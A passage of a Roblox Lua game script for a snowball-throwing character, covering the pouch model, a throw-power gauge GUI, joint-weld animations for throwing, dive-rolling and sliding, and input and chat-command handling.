		val.Value = obj 
		local val2 = Instance.new("NumberValue",val) 
		val2.Name = "value" 
		val2.Value = value 
		if type == "PingTestIncrement" then 
			local val3 = Instance.new("NumberValue",val) 
			val3.Name = "time" 
			val3.Value = repstor.TickTimer.Value 
		end 
		val.Parent = workspace.ValueChanger1 
	end 

	function SnowballHit(part,pos,power) 
		if part.Parent:findFirstChild("Humanoid") then 
			local dmg = (45*power) - math.random(1,4) 
			dmg = power > 0.99 and dmg*1.25 or dmg 
			print("Damaging",part.Parent.Name,"by",dmg) 
			part.Parent.Humanoid.Health = -dmg
		end 
		SnowSplosion(pos) 
	end 

	function SnowSplosion(pos) 
		local spmdl = Instance.new("Model", char) 
		spmdl.Name = "SnoSplosion" 
		for i = 1, 14 do 
			local p = P:Clone() 
			p.Parent = spmdl 
			p.Name = "Effect" 
			p.Anchored = true 
			p.BrickColor = BrickColor.new("White") 
			p.CFrame = CFrame.new(pos) * CFrame.Angles(0,(math.pi*2)*math.random(),(math.pi*2)*math.random()) * CFrame.new(0.05,0,0) 
			p.Transparency = 0.2 
			local mesh = Instance.new("SpecialMesh",p) 
			mesh.MeshType = "Sphere" 
			mesh.Scale = Vector3.new(5,2,2) 
		end 
		table.insert(SnowSplosionEffects,spmdl) 
	end 
	----------------------------------

	---- value setup ---------

	local pose = Instance.new("IntValue", script) 
	pose.Name = "pose" 
	pose.Value = 0 
	local invoke = Instance.new("IntValue", script) 
	invoke.Name = "invoke" 
	invoke.Value = 0 
	local snowballs = Instance.new("IntValue", script) 
	snowballs.Name = "snowballs" 
	snowballs.Value = 8 
	local Main = Instance.new("ObjectValue", script) 
	Main.Name = "Main" 

	for i, v in pairs(char:GetChildren()) do 
		if v.Name == "health" and v.className == "NumberValue" then 
			v:Destroy() 
		end 
	end 
	local health = Instance.new("NumberValue", char) 
	health.Name = "health" 
	health.Value = 100 
	health.Changed:connect(function() 
		if health.Value <= 0 then 
			char:BreakJoints() 
		end 
	end) 

	snowballs.Changed:connect(function() 
		snowballs.Value = snowballs.Value > 8 and 8 or snowballs.Value 
		snowballs.Value = snowballs.Value < 0 and 0 or snowballs.Value 
		local percentage = snowballs.Value/8 
		SnowPart.Mesh.Scale = Vector3.new(0.71,0.6*percentage,0.71) *5 
		SnowPart.Weld.C0 = CFrame.new(0,-0.08 - (0.3*(1-percentage)),0) 
		SnowPart.Transparency = percentage == 0 and 1 or 0 
	end) 

	player.Chatted:connect(function(msg) 
		if string.sub(msg:lower(),1,5) == "pose/" then 
			pose.Value = tonumber(string.sub(msg,6)) 
		elseif string.sub(msg:lower(),1,7) == "invoke/" then 
			invoke.Value = tonumber(string.sub(msg,8)) 
		elseif msg == "replenish" then 
			snowballs.Value = 8 
		end 
	end) 

	------ designs -------------
	function Build() 
		for i, v in pairs(char:children()) do 
			if v.Name == "Mozzarella" then 
				v:Destroy() 
			end
		end
		local m = Instance.new("Model", script) 
		m.Name = "Mozzarella" 

		local b = P:Clone() 
		b.Parent = m 
		b.Name = "Bag" 
		b.BrickColor = BrickColor.new("Lime green") 
		b.Transparency = 1 
		local mesh = Instance.new("SpecialMesh",b) 
		mesh.MeshType = "Brick" 
		mesh.Scale = Vector3.new(0.8,0.6,0.8) *5 
		local w = Instance.new("Weld",b) 
		w.Part0 = RL 
		w.Part1 = b 
		w.C0 = CFrame.new(0.82,0.5,0) 

		for i = 1, 10 do 
			local p = P:Clone() 
			p.Parent = m 
			p.Name = "BagPart" 
			p.BrickColor = BrickColor.new("Dark orange") 
			p.Material = "Fabric" 
			local mesh = Instance.new("SpecialMesh",p) 
			mesh.MeshType = "Brick" 
			mesh.Scale = Vector3.new(0.1,0.4,0.26) *5 
			local w = Instance.new("Weld",p) 
			w.Part0 = b 
			w.Part1 = p 
			w.C1 = CFrame.new(0.35,0.004*(i%2),0) 
			w.C0 = CFrame.new(0,0.1,0) * CFrame.Angles(0,math.pi*2/10*i,0) 

			if i%2 == 0 then 
				for j = 0, 6 do 
					local mathi = math.sin(math.pi/2 + (math.pi/5*j)) 
					local p = P:Clone() 
					p.Parent = m 
					p.Name = "BagPart" 
					p.BrickColor = BrickColor.new("Dark orange") 
					p.Material = "Fabric" 
					local mesh = Instance.new("SpecialMesh",p) 
					mesh.MeshType = "Brick" 
					mesh.Scale = Vector3.new(0.1,0.22,0.26*mathi) *5 
					local w = Instance.new("Weld",p) 
					w.Part0 = b 
					w.Part1 = p 
					w.C1 = CFrame.new(0.35,0,0) 
					w.C0 = CFrame.new(0,-0.2,0) * CFrame.Angles(0,math.pi*2/10*i,math.pi/6*j) 
				end 
			end 
		end 

		local s = P:Clone() 
		s.Parent = m 
		s.Name = "Snow" 
		s.BrickColor = BrickColor.new("White") 
		s.Transparency = 0 
		s.Material = "Sand" 
		local mesh = Instance.new("CylinderMesh",s) 
		mesh.Scale = Vector3.new(0.71,0.6,0.71) *5 
		local w = Instance.new("Weld",s) 
		w.Part0 = b 
		w.Part1 = s 
		w.C0 = CFrame.new(0,-0.08,0) 
		SnowPart = s 

	end 
	Build() 
	--------------------------------


	-------------- snowball power charge gui ----------------------------
	function CreateGui() 
		for i, v in pairs(Gui:GetChildren()) do 
			if v.Name == "SnowballPower" then 
				v:Destroy() 
			end 
		end 
		local g = Instance.new("ScreenGui", Gui) 
		g.Name = "SnowballPower" 
		local f = Instance.new("Frame",g) 
		f.Name = "Container" 
		f.Size = UDim2.new(0,30,0,110) 
		f.Position = UDim2.new(1,10,0.5,-55) 
		f.Transparency = 0 
		f.BackgroundColor3 = Color3.new(0.45,0.35,0.25)
		f.BorderColor3 = Color3.new(0.55,0.45,0.35)
		f.BorderSizePixel = 3 
		f.Archivable = false 
		f.ZIndex = 0 
		SPC = f 
		local b = Instance.new("Frame",f) 
		b.Name = "Backing" 
		b.Size = UDim2.new(0,20,0,100) 
		b.Position = UDim2.new(0.5,-10,0.5,-50) 
		b.BorderSizePixel = 0 
		b.BackgroundColor3 = Color3.new(0.1,0.45,0.01) 
		b.ZIndex = 1 
		SPB = b 
		local fr = b:Clone() 
		fr.Parent = b 
		fr.Size = UDim2.new(1,0,0.5,0) 
		fr.Position = UDim2.new(0,0,0.5,0) 
		fr.BackgroundColor3 = Color3.new(0.1,0.65,0.01) 
		SPF = fr 

	end 
	CreateGui() 

	-------------- limb setup ---------------
	pcall(function() char.Animate:Destroy() end) 

	SetWeld(RS,1,1,NV,NV,Vector3.new(1.5,0.5,0),NV) 
	RS.C1 = CFrame.new(0,0.5,0) 

	SetWeld(LS,1,1,NV,NV,Vector3.new(-1.5,0.5,0),NV) 
	LS.C1 = CFrame.new(0,0.5,0) 

	SetWeld(RH,1,1,NV,NV,Vector3.new(0.5,-1,0),NV) 
	RH.C1 = CFrame.new(0,1,0) 

	SetWeld(LH,1,1,NV,NV,Vector3.new(-0.5,-1,0),NV) 
	LH.C1 = CFrame.new(0,1,0) 

	SetWeld(N,1,1,NV,NV,Vector3.new(0,1,0),NV) 
	N.C1 = CFrame.new(0,-0.5,0) 

	SetWeld(HRJ,1,1,NV,NV,NV,NV) 
	HRJ.C1 = CFrame.new(0,0,0) 

	wait(1) 
	RS.MaxVelocity = 0 
	RS.CurrentAngle = 0 
	RS.DesiredAngle = 0 
	LS.MaxVelocity = 0 
	LS.CurrentAngle = 0 
	LS.DesiredAngle = 0 
	RH.MaxVelocity = 0 
	RH.CurrentAngle = 0 
	RH.DesiredAngle = 0 
	LH.MaxVelocity = 0 
	LH.CurrentAngle = 0 
	LH.DesiredAngle = 0 
	N.MaxVelocity = 0 
	N.CurrentAngle = 0 
	N.DesiredAngle = 0 
	HRJ.MaxVelocity = 0 
	HRJ.CurrentAngle = 0 
	HRJ.DesiredAngle = 0 

	-----------------

	----- value changed connections ---- 
	Main.Changed:connect(function() 
		if Main.Value ~= nil then 
			main,maina = GetWeld(Main.Value) 
		else 
			main,maina = nil,nil 
		end 
	end) 

	Hu.Changed:connect(function() 
		if disableJump or DisableMovement then 
			Hu.Jump = false 
		end 
	end) 

	------- Keys & Mouse ---------------
	function B1D() 
		MouseDown = true 
		if not Animating then 
			script.invoke.Value = 1 
		else 
			while Animating do 
				wait() 
			end 
			if MouseDown then 
				script.invoke.Value = 1 
			end 
		end 
	end 
	function B1U() 
		MouseDown = false 
	end 
	mouse.Button1Down:connect(B1D) 
	mouse.Button1Up:connect(B1U) 

	function KD(key) 
		if key == "0" then 
			Shift = true 
			if pose.Value == 1 then 
				pose.Value = 0 
				disableJump = false 
			end 
		elseif key == "4" then 
			Alt = true 
			if not Animating and SlideCooldown == 0 then 
				invoke.Value = 3 
			else 
				while Animating or SlideCooldown > 0 do 
					wait() 
				end 
				if Alt then 
					invoke.Value = 3 
				end 
			end 
		elseif key == "2" then 
			if not ThrowingSequence then 
				if pose.Value == 0 then 
					pose.Value = 1 
					disableJump = true 
				elseif pose.Value == 1 then 
					pose.Value = 0 
					disableJump = false 
				end 
			end 
		elseif key == string.char(32) then 
			Space = true 
			if pose.Value == 1 then 
				if not Animating then 
					invoke.Value = 2 
				else 
					while Animating do 
						wait() 
					end 
					if Space and pose.Value == 1 then 
						invoke.Value = 2 
					end 
				end 
			end 
		end 
	end 

	function KU(key) 
		if key == "0" then 
			Shift = false 
		elseif key == "4" then 
			Alt = false 
		elseif key == string.char(32) then 
			Space = false 
		end 
	end 

	mouse.KeyDown:connect(KD) 
	mouse.KeyUp:connect(KU) 

	local count1 = 0 
	local angle = 0 
	local slidecount = 1 
	local slidecountmax = 1 
	local countspeed = 0.5 
	local cancella = false 
	local cancelra = false 
	local cancelrl = false 
	local cancelll = false 
	local canceln = false 
	local cancelhrp = false 
	local cancelmain = false 
	local anim = 0 
	local lastanim = -1 
	local lastpose = 0 
	local rs,rsa, ls,lsa, rh,rha, lh,lha, n,na, hrj,hrja, main,maina 
	local ghitz,genz 
	local prevvelocity = HRP.Velocity 

	function UpdateWP(max,sped) 
		max = max or 5 
		sped = sped or AnimSpeeds[anim+1] 
		rs,rsa = GetWeld(RS) 
		ls,lsa = GetWeld(LS) 
		rh,rha = GetWeld(RH) 
		lh,lha = GetWeld(LH) 
		n,na = GetWeld(N) 
		hrj,hrja = GetWeld(HRJ) 
		if Main.Value ~= nil then 
			main,maina = GetWeld(Main.Value) 
		end 
		slidecount = 0 
		slidecountmax = max 
		countspeed = sped 
	end 

	UpdateWP() 
	-------------- Invoke Animations -------------------------
	function Throw() 
		if not Animating and snowballs.Value > 0 then 
			Animating = true 
			ThrowingSequence = true 
			pose.Value = 0 
			disableJump = false 
			----- sword slash ------
			cancelra = true 
			cancella = true 
			cancelhrp = true 
			canceln = true 
			cancelmain = true 
			local prevslidecount = slidecount 
			UpdateWP(slidecountmax,countspeed) 
			slidecount = prevslidecount 

			local phase = 0 
			local smdl = Instance.new("Model",char) 
			smdl.Name = "SnowBall" 
			local ball,weld 
			for i = 1, 17 do 
				if MouseDown then 
					if i <= 7 then 
						SetWeld(N,i,7,n,na,Vector3.new(0,1,0),Vector3.new(-0.3,-math.pi/8,0)) 
						SetWeld(HRJ,i,7,hrj,hrja,Vector3.new(0,0,0.1),Vector3.new(0,-math.pi/20,0)) 
						SetWeld(RS,i,7,rs,rsa,Vector3.new(1.5,0.26,0),Vector3.new(-0.2,0,-0.1)) 
						SetWeld(LS,i,7,ls,lsa,Vector3.new(-1.5,0.525,-0.01),Vector3.new(-0.25,0,-0.12)) 
						phase = 1 
						if i == 7 then 
							UpdateWP(slidecountmax,countspeed) 
							ChangeValue(snowballs,"Increment",-1) 
							ball = P:Clone() 
							ball.Parent = smdl 
							ball.BrickColor = BrickColor.new("White") 
							ball.Material = "Sand" 
							local mesh = Instance.new("SpecialMesh",ball) 
							mesh.MeshType = "Sphere" 
							mesh.Scale = Vector3.new(0.8,0.8,0.8) *5 
							weld = Instance.new("Weld",ball) 
							weld.Part0 = RA 
							weld.Part1 = ball 
							weld.C0 = CFrame.new(0,-1.3,0) 
						end 
					else 
						SetWeld(N,i-7,10,n,na,Vector3.new(0,1,0),Vector3.new(0.03,math.pi/9,0)) 
						SetWeld(HRJ,i-7,10,hrj,hrja,Vector3.new(0,0,0.1),Vector3.new(0,-math.pi/8,0)) 
						SetWeld(RS,i-7,10,rs,rsa,Vector3.new(1.4,0.5,0),Vector3.new(math.pi*1.05,0,0.2)) 
						SetWeld(LS,i-7,10,ls,lsa,Vector3.new(-1.3,0.42,-0.1),Vector3.new(math.pi/4,0,-math.pi/8)) 
						if i == 9 then 
							SPC.Archivable = true 
							SPB.BackgroundColor3 = Color3.new(0.45,0.1,0.01) 
							SPF.BackgroundColor3 = Color3.new(0.65,0.1,0.01) 
							SPF.Size = UDim2.new(1,0,0,0) 
							SPF.Position = UDim2.new(0,0,1,0) 
						end 
						phase = 2 
					end 
					wait(0.02) 
				end 
			end 
			local rs2,rsa2 = GetWeld(RS) 
			local ls2,lsa2 = GetWeld(LS) 
			local n2,na2 = GetWeld(N) 
			local hrj2,hrja2 = GetWeld(HRJ) 

			local powercounter = 20 
			local power = 0 
			while MouseDown do 
				powercounter = (powercounter%40) + 1 
				power = 1 - math.sin(math.pi/40*powercounter) 
				SPB.BackgroundColor3 = Color3.new((1-power)*0.35 +0.1,power*0.35 +0.1,0.01) 
				SPF.BackgroundColor3 = Color3.new((1-power)*0.55 +0.1,power*0.55 +0.1,0.01) 
				SPF.Size = UDim2.new(1,0,power,0) 
				SPF.Position = UDim2.new(0,0,1-power,0) 
				SetWeld(RS,power,1,rs2,rsa2,Vector3.new(1.4,0.6,0.05),Vector3.new(math.pi*1.17,0,0.3)) 
				SetWeld(LS,power,1,ls2,lsa2,Vector3.new(-1.3,0.42,-0.16),Vector3.new(math.pi/2.45,0,-math.pi/5)) 
				SetWeld(N,power,1,n2,na2,Vector3.new(0,1,0),Vector3.new(0.07,math.pi/8,-0.04)) 
				SetWeld(HRJ,power,1,hrj2,hrja2,Vector3.new(0,0,0.1),Vector3.new(0,-math.pi/7,0)) 
				phase = 3 
				wait(0.02) 
			end 
			SPC.Archivable = false 
			print("Phase:",phase) 
			rs2,rsa2 = GetWeld(RS) 
			ls2,lsa2 = GetWeld(LS) 
			n2,na2 = GetWeld(N) 
			hrj2,hrja2 = GetWeld(HRJ) 

			if phase == 1 or phase == 2 then 
				smdl:Destroy() 
				ChangeValue(snowballs,"Increment",1) 
			elseif phase == 3 then 
				print("Throwing with "..string.sub(tostring(power*100),1,5).."% power!") 
				local mousepos = mouse.Hit.p 
				for i = 1, 8 do 
					SetWeld(RS,i,8,rs2,rsa2,Vector3.new(1.4,0.6,0.05),Vector3.new((math.pi*0.6) -(1.8*power),0.18 - (0.65*power),0.3)) 
					SetWeld(LS,i,8,ls2,lsa2,Vector3.new(-1.36,0.5,-0.06),Vector3.new((-math.pi/4) - (0.4*power),0.2,-math.pi/5)) 
					SetWeld(N,i,8,n2,na2,Vector3.new(0,1,0),Vector3.new(-0.07,-math.pi/11 - (0.3*power),-0.04)) 
					SetWeld(HRJ,i,8,hrj2,hrja2,Vector3.new(0,0,0.1),Vector3.new(0,(math.pi/10)+(0.3*power),0)) 
					if i == 2 then 
						weld:Destroy() 
						ball.Anchored = true 
						--- {part,gravity,currentgravity,direction,speed,power,counter,{parts},life}
						local snowball = {ball,0.1 + 0.8*(0.96-power),1 - (0.95*power),(mousepos-ball.Position).unit,1.8 + (3*power),power,1,{},0} 
						if power > 0.99 then
							for i = 1, 20 do 
								local p = P:Clone() 
								p.Anchored = true 
								p.BrickColor = BrickColor.new("Bright yellow") 
								local mesh = Instance.new("SpecialMesh",p) 
								mesh.MeshId = "rbxassetid://9756362" 
								mesh.Scale = Vector3.new(0.32,0.32,0.32) 
								table.insert(snowball[8],p) 
							end 
						end 
						table.insert(SnowballProjectiles,snowball) 
					end 
					wait(0.02) 
				end 
				wait(0.02) 
			else 
				smdl:Destroy() 
			end 

			UpdateWP(slidecountmax,countspeed) 
			cancelra = false 
			cancella = false 
			cancelhrp = false 
			canceln = false 
			cancelmain = false 

			ThrowingSequence = false 
			Animating = false 
		elseif snowballs.Value <= 0 then 
			print("No snow left!") 
			-- alert saying you have no snow left in pouch
		end 
	end 

	function DiveRoll() 
		if not Animating then 
			Animating = true 
			DisableMovement = true 
			cancelra = true 
			cancella = true 
			cancelhrp = true 
			canceln = true 
			cancelmain = true 
			cancelll = true 
			cancelrl = true 
			local prevslidecount = slidecount 
			UpdateWP(slidecountmax,countspeed) 
			slidecount = prevslidecount 

			local bv = Instance.new("BodyVelocity", HRP) 
			bv.maxForce = Vector3.new(1/0,0,1/0) 
			bv.velocity = CFrame.new(NV,Vector3.new(HRP.CFrame.lookVector.x,0,HRP.CFrame.lookVector.z)).lookVector * 28 
			local bg = Instance.new("BodyGyro", HRP) 
			bg.maxTorque = Vector3.new(1/0,1/0,1/0) 
			bg.cframe = CFrame.new(NV,Vector3.new(HRP.CFrame.lookVector.x,0,HRP.CFrame.lookVector.z)) 
			bg.D = 100 
			game:GetService("Debris"):AddItem(bv,2.5) 
			game:GetService("Debris"):AddItem(bg,2.5) 

			local connex = game:GetService("RunService").RenderStepped:connect(function() 
				if HRP.Velocity.y > 0 then 
					HRP.Velocity = NV 
				end 
				HRP.CanCollide = false 
			end) 
			local connex2 = game:GetService("RunService").Stepped:connect(function() 
				local Ghitz,Genz = RAY(HRP.Position,Vector3.new(0,-3.1,0)) 
				if Ghitz then 
					HRP.CFrame = (HRP.CFrame - HRP.Position) + Genz + Vector3.new(0,3,0) 
				end 
			end) 

			local animspd = 4 
			for i = 1, animspd do 
				SetWeld(N,i,animspd,n,na,Vector3.new(0,1,0),Vector3.new(math.pi/5,0,0),0) 
				SetWeld(HRJ,i,animspd,hrj,hrja,Vector3.new(0,0.4,0),Vector3.new(-math.pi/2.6,0,0),0) 
				SetWeld(RS,i,animspd,rs,rsa,Vector3.new(1.4,0.5,-0.06),Vector3.new(math.pi/1.2,0,0.2),0) 
				SetWeld(LS,i,animspd,ls,lsa,Vector3.new(-1.4,0.5,-0.06),Vector3.new(math.pi/1.2,0,-0.2),0) 
				SetWeld(RH,i,animspd,rh,rha,Vector3.new(0.5,-0.6,-0.1),Vector3.new(0.1,0,0.05),0) 
				SetWeld(LH,i,animspd,lh,lha,Vector3.new(-0.5,-0.6,-0.1),Vector3.new(0.1,0,-0.05),0) 
				wait(0.02) 
			end 
			UpdateWP(slidecountmax,countspeed) 
			for i = 1, animspd do 
				SetWeld(N,i,animspd,n,na,Vector3.new(0,1,0),Vector3.new(math.pi/12,0,0),0) 
				SetWeld(HRJ,i,animspd,hrj,hrja,Vector3.new(0,-0.7,0),Vector3.new(-math.pi/1.5,0,0),0) 
				SetWeld(RS,i,animspd,rs,rsa,Vector3.new(1.4,0.6,-0.06),Vector3.new(math.pi/1.3,0,0.2),0) 
				SetWeld(LS,i,animspd,ls,lsa,Vector3.new(-1.4,0.6,-0.06),Vector3.new(math.pi/1.3,0,-0.2),0) 
				SetWeld(RH,i,animspd,rh,rha,Vector3.new(0.5,-1,0),Vector3.new(-0.1,0,0.05),0) 
				SetWeld(LH,i,animspd,lh,lha,Vector3.new(-0.5,-1,0),Vector3.new(-0.1,0,-0.05),0) 
				wait(0.02) 
			end 
			UpdateWP(slidecountmax,countspeed) 
			for i = 1, animspd do 
				SetWeld(N,i,animspd,n,na,Vector3.new(0,0.85,0),Vector3.new(-math.pi/4,0,0),0) 
				SetWeld(HRJ,i,animspd,hrj,hrja,Vector3.new(0,-1,0),Vector3.new(-math.pi*0.9,0,0),0) 
				SetWeld(RS,i,animspd,rs,rsa,Vector3.new(1.4,0.5,-0.06),Vector3.new(math.pi/1.4,0,0.08),0) 
				SetWeld(LS,i,animspd,ls,lsa,Vector3.new(-1.4,0.5,-0.06),Vector3.new(math.pi/1.4,0,-0.08),0) 
				SetWeld(RH,i,animspd,rh,rha,Vector3.new(0.5,-0.3,-0.4),Vector3.new(-0.12,0,0.05),0) 
				SetWeld(LH,i,animspd,lh,lha,Vector3.new(-0.5,-0.3,-0.4),Vector3.new(-0.12,0,-0.05),0) 
				wait(0.02) 
			end 
			UpdateWP(slidecountmax,countspeed) 
			bv.velocity = bv.velocity * 0.9 
			for i = 1, animspd do 
				SetWeld(N,i,animspd,n,na,Vector3.new(0,0.85,0),Vector3.new(-math.pi/3.5,0,0),0) 
				SetWeld(HRJ,i,animspd,hrj,hrja,Vector3.new(0,-1.25,0),Vector3.new(-math.pi*1.1,0,0),0) 
				SetWeld(RS,i,animspd,rs,rsa,Vector3.new(1.4,0.5,-0.06),Vector3.new(math.pi/1.8,0,-0.1),0) 
				SetWeld(LS,i,animspd,ls,lsa,Vector3.new(-1.4,0.5,-0.06),Vector3.new(math.pi/1.8,0,0.1),0) 
				SetWeld(RH,i,animspd,rh,rha,Vector3.new(0.5,0.2,-0.7),Vector3.new(-0.12,0,0.05),0) 
				SetWeld(LH,i,animspd,lh,lha,Vector3.new(-0.5,0.2,-0.7),Vector3.new(-0.12,0,-0.05),0) 
				wait(0.02) 
			end 
			UpdateWP(slidecountmax,countspeed) 
			for i = 1, animspd do 
				SetWeld(N,i,animspd,n,na,Vector3.new(0,0.85,0),Vector3.new(-math.pi/3.7,0,0),0) 
				SetWeld(HRJ,i,animspd,hrj,hrja,Vector3.new(0,-2.3,0),Vector3.new(-math.pi*1.55,0,0),0) 
				SetWeld(RS,i,animspd,rs,rsa,Vector3.new(1.4,0.5,-0.06),Vector3.new(math.pi/2.4,0,-0.23),0) 
				SetWeld(LS,i,animspd,ls,lsa,Vector3.new(-1.4,0.5,-0.06),Vector3.new(math.pi/2.4,0,0.23),0) 
				SetWeld(RH,i,animspd,rh,rha,Vector3.new(0.5,0.1,-0.7),Vector3.new(-0.1,0,0.04),0) 
				SetWeld(LH,i,animspd,lh,lha,Vector3.new(-0.5,0.1,-0.7),Vector3.new(-0.1,0,-0.04),0) 
				wait(0.02) 
			end 
			UpdateWP(slidecountmax,countspeed) 
			bv.velocity = bv.velocity * 0.7 
			for i = 1, animspd do 
				SetWeld(N,i,animspd,n,na,Vector3.new(0,1.05,0),Vector3.new(-0.4,0,0),0) 
				SetWeld(HRJ,i,animspd,hrj,hrja,Vector3.new(0,-1.6,0),Vector3.new(-math.pi*1.85,0,0),0) 
				SetWeld(RS,i,animspd,rs,rsa,Vector3.new(1.4,0.5,-0.06),Vector3.new(math.pi/3.2,0,-0.24),0) 
				SetWeld(LS,i,animspd,ls,lsa,Vector3.new(-1.4,0.5,-0.06),Vector3.new(math.pi/3.2,0,0.24),0) 
				SetWeld(RH,i,animspd,rh,rha,Vector3.new(0.5,-0.08,-0.6),Vector3.new(-0.22,0,0.04),0) 
				SetWeld(LH,i,animspd,lh,lha,Vector3.new(-0.5,-0.08,-0.6),Vector3.new(-0.22,0,-0.04),0) 
				wait(0.02) 
			end 
			UpdateWP(slidecountmax,countspeed) 
			bv.velocity = bv.velocity * 0.4 
			for i = 1, animspd do 
				SetWeld(RS,i,animspd,rs,rsa,Vector3.new(1.35,0.66 + (angle*0.012),0.12),Vector3.new(0.2 + (angle*0.02),-0.22,0.446 + (angle*0.016)),0) 
				SetWeld(LS,i,animspd,ls,lsa,Vector3.new(-1.35,0.66 + (angle*0.012),0.12),Vector3.new(0.2 + (angle*0.02),0.22,-0.446 - (angle*0.016)),0) 
				SetWeld(RH,i,animspd,rh,rha,Vector3.new(0.7,-0.18 - (cangle*0.04),-0.2 - (angle*0.01)),Vector3.new(0.2 - (angle*0.12),-math.pi/5,0.12 - (angle*0.06)),0) 
				SetWeld(LH,i,animspd,lh,lha,Vector3.new(-0.38,-0.32 + (cangle*0.04),-0.45 + (angle*0.01)),Vector3.new(-0.1 + (angle*0.15),-math.pi/5,-0.07 + (angle*0.07)),0) 
				SetWeld(N,i,animspd,n,na,Vector3.new(0,1,0),Vector3.new(0.12 + (angle*0.004),-math.pi/5 - (angle*0.01),0.1),0) 
				SetWeld(HRJ,i,animspd,hrj,hrja,Vector3.new(0,-0.7,0),Vector3.new((-math.pi*2) -0.24 + (-angle*0.008),math.pi/5 + (angle*0.01),angle*0.01),0) 
				wait(0.02) 
			end 

			SetWeld(HRJ,1,1,hrj,hrja,Vector3.new(0,-0.7,0),Vector3.new(-0.24 + (-angle*0.008),math.pi/5 + (angle*0.01),angle*0.01)) 
			bv:Destroy() 
			bg:Destroy() 
			connex:disconnect() 
			connex2:disconnect() 

			UpdateWP() 
			cancelra = false 
			cancella = false 
			cancelhrp = false 
			canceln = false 
			cancelmain = false 
			cancelll = false 
			cancelrl = false 
			Animating = false 
			DisableMovement = false 
		end 
	end 

	function Slide() 
		if not Animating and Shift and pose.Value == 0 and SlideCooldown == 0 and Vector3.new(Torsoz.Velocity.x,0,Torsoz.Velocity.z).magnitude >= 18 then 
			Animating = true 
			DisableMovement = true 
			cancelra = true 
			cancella = true 
			cancelhrp = true 
			canceln = true 
			cancelmain = true 
			cancelll = true 
			cancelrl = true 
			local prevslidecount = slidecount 
			UpdateWP(slidecountmax,countspeed) 
			slidecount = prevslidecount 

			local bv = Instance.new("BodyVelocity", HRP) 
			bv.maxForce = Vector3.new(1/0,0,1/0) 
			bv.velocity = CFrame.new(NV,Vector3.new(HRP.CFrame.lookVector.x,0,HRP.CFrame.lookVector.z)).lookVector * 30 
			local bg = Instance.new("BodyGyro", HRP) 
			bg.maxTorque = Vector3.new(1/0,1/0,1/0) 
			bg.cframe = CFrame.new(NV,Vector3.new(HRP.CFrame.lookVector.x,0,HRP.CFrame.lookVector.z)) 
			bg.D = 100 
			game:GetService("Debris"):AddItem(bv,5.5) 
			game:GetService("Debris"):AddItem(bg,5.5) 

			local connex = game:GetService("RunService").RenderStepped:connect(function() 
				if HRP.Velocity.y > 0 then 
					HRP.Velocity = NV 
				end 
				HRP.CanCollide = false 
			end) 

			local animspd = 8 
			local animcount = 1 
			local bvaccel = 1 
			local bvvelo = bv.velocity 
			local lasttorpos = HRP.Position 
			local tickcount = 0 
			local cancelslide = false 
			local torsoangle = 0 
			while not cancelslide and  bvaccel > 0.16 do 
				tickcount = tickcount+1 
				lasttorpos = HRP.Position 
				animcount = (animcount < animspd and animcount+1) or animspd 
				local n2,na2 = GetWeld(N) 
				local hrj2,hrja2 = GetWeld(HRJ) 
				local rs2,rsa2 = GetWeld(RS) 
				local ls2,lsa2 = GetWeld(LS) 
				local rh2,rha2 = GetWeld(RH) 
				local lh2,lha2 = GetWeld(LH) 
				SetWeld(N,1,4,n2,na2,Vector3.new(0,1.08,-0.1),Vector3.new(-math.pi/4.3,-0.12,-0.08)) 
				SetWeld(HRJ,1,4,hrj2,hrja2,Vector3.new(0,-2.1,0),Vector3.new((math.pi/2.6)+torsoangle,0.12 + (angle*0.008),0)) 
				SetWeld(RS,1,4,rs2,rsa2,Vector3.new(1.4,0.6,-0.02),Vector3.new(-math.pi/1.8,-(angle*0.01),0.2 - (angle*0.009))) 
				SetWeld(LS,1,4,ls2,lsa2,Vector3.new(-1.3,0.6,-0.16),Vector3.new(-math.pi/1.8,-(angle*0.01),-0.6 - (angle*0.009))) 
				SetWeld(RH,1,4,rh2,rha2,Vector3.new(0.5,-0.8,0),Vector3.new(0.22,-0.06 - (angle*0.01),0.05)) 
				SetWeld(LH,1,4,lh2,lha2,Vector3.new(-0.5,-0.35,-0.45),Vector3.new(-0.25,-0.12 - (angle*0.01),-0.03)) 
				bv.velocity = bvvelo * bvaccel 
				wait(0.02) 
				local torsoatan = (CFrame.new(lasttorpos) * (HRP.CFrame-HRP.Position)):pointToObjectSpace(HRP.Position) 
				torsoangle = math.atan2(torsoatan.y,-torsoatan.z) 
				local Ghitz,Genz = RAY(HRP.Position,Vector3.new(0,-3.1,0)) 
				if Ghitz then 
					HRP.CFrame = (HRP.CFrame - HRP.Position) + Genz + Vector3.new(0,3,0) 
				end 
				if (lasttorpos.y - HRP.Position.y) < -0.1 then 
					bvaccel = bvaccel - 0.045 
				elseif (lasttorpos.y - HRP.Position.y) > 0.08 then 
					bvaccel = bvaccel - 0.006 
					if Ghitz then 
						bvaccel = bvaccel + ((lasttorpos.y - HRP.Position.y) /2.5) 
					end 
				else 
					bvaccel = bvaccel - 0.017 
				end 
				bvaccel = bvaccel > 1.02 and 1.02 or bvaccel 
				local chitz,cenz = RAY(Torsoz.Position,Vector3.new(0,2.5,0)) 
				local stationary = false 
				if tickcount > 5 then 
					stationary = (Vector3.new(lasttorpos.x,0,lasttorpos.z) - Vector3.new(HRP.Position.x,0,HRP.Position.z)).magnitude < 0.15 
				end 
				if bvaccel < 0.16 or (chitz == nil and not Alt) or stationary then 
					cancelslide = true 
				end 
			end 

			SlideCooldown = 14 
			bv:Destroy() 
			bg:Destroy() 
			connex:disconnect() 

			UpdateWP(slidecountmax,countspeed) 
			cancelra = false 
			cancella = false 
			cancelhrp = false 
			canceln = false 
			cancelmain = false 
			cancelll = false 
			cancelrl = false 
			Animating = false 
			DisableMovement = false 
		end 
	end 

	invokelist = {} 
	invokelist[1] = Throw 
	invokelist[2] = DiveRoll 
	invokelist[3] = Slide 
	invoke.Changed:connect(function() 
		if invoke.Value ~= 0 then 
			local valu = invoke.Value 
			invoke.Value = 0 
			if invokelist[valu] ~= nil then 
				invokelist[valu]() 
			end 
		end 
	end) 

	-------------- Animation Tween Funcs ----------------------
	function Idle() 
		if script.pose.Value == 0 then 
			----- regular --------
			if not cancelra then 
				SetWeld(RS,slidecount,slidecountmax,rs,rsa,Vector3.new(1.5,0.5,0),Vector3.new(-0.1 + (angle*0.027),0,0.046 - (angle*0.021))) 
			end
			if not cancella then 
				SetWeld(LS,slidecount,slidecountmax,ls,lsa,Vector3.new(-1.5,0.5,0),Vector3.new(-0.1 + (angle*0.027),0,-0.046 + (angle*0.021))) 
			end 
			if not cancelrl then 
